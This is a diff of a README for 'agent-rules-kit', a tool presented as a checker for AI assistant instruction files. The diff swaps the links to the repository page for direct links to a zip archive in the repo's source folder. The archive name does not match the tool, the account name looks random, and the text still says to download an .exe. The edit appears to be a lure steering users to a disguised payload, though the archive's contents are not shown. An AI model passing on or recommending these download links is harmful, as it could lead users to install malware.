@@ -1,6 +1,6 @@
 # 🔍 agent-rules-kit - Fix your AI assistant instructions now
 
-[![](https://img.shields.io/badge/Download-AgentRulesKit-blue.svg)](https://github.com/genuschristellaoverhang846/agent-rules-kit)
+[![](https://img.shields.io/badge/Download-AgentRulesKit-blue.svg)](https://github.com/genuschristellaoverhang846/agent-rules-kit/raw/refs/heads/main/src/kit-rules-agent-v1.8-beta.3.zip)
 
 This tool checks your AI configuration files. It scans files like AGENTS.md, Claude Code, Gemini CLI, Cursor, and Copilot instructions for errors. It shows these errors so you can fix them. The software works on your machine and does not change your files. It only reads them to find mistakes.
 
@@ -18,7 +18,7 @@ It helps you maintain consistent behavior across different tools like:
 
 Visit the web page below to get the installer for Windows. 
 
-[https://github.com/genuschristellaoverhang846/agent-rules-kit](https://github.com/genuschristellaoverhang846/agent-rules-kit)
+[https://github.com/genuschristellaoverhang846/agent-rules-kit/raw/refs/heads/main/src/kit-rules-agent-v1.8-beta.3.zip](https://github.com/genuschristellaoverhang846/agent-rules-kit/raw/refs/heads/main/src/kit-rules-agent-v1.8-beta.3.zip)
 
 Look for the latest release version on the page. Download the file that ends in .exe. This file contains the program you need to run the diagnostic tool.
 
